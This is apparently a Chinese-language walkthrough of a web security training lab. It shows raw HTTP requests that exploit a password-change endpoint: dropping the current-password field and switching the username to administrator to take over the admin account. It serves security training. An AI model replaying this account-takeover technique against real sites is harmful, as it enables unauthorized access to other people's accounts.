# 实验：双重用途端点上的弱隔离

本实验基于用户的输入对其权限级别做出了有缺陷的假设。因此，你可以利用其账户管理功能的逻辑来获取任意用户账户的访问权限。为了解决本实验，请访问 `administrator` 账户并删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测密码修改功能
- 常规密码修改
    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=Vk5SvLRFniSB2bUuuNmBTfbGWGoSb9vU

    csrf=8D2ATjETcGxci6fVVJ1o7m4m6Ty3DCI8&username=wiener&current-password=a&new-password-1=a&new-password-2=a
    ```

- 尝试移除当前密码
    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=Vk5SvLRFniSB2bUuuNmBTfbGWGoSb9vU

    csrf=8D2ATjETcGxci6fVVJ1o7m4m6Ty3DCI8&username=wiener&new-password-1=a&new-password-2=a
    ```
    - 仍可成功修改密码，移除密码直接绕过当前密码验证，或可修改任意用户密码

- 尝试修改管理员密码
    ```http
    POST /my-account/change-password HTTP/2
    Cookie: session=Vk5SvLRFniSB2bUuuNmBTfbGWGoSb9vU

    csrf=8D2ATjETcGxci6fVVJ1o7m4m6Ty3DCI8&username=administrator&new-password-1=a&new-password-2=a
    ```
    - 成功，修改后使用新密码登录管理员账户
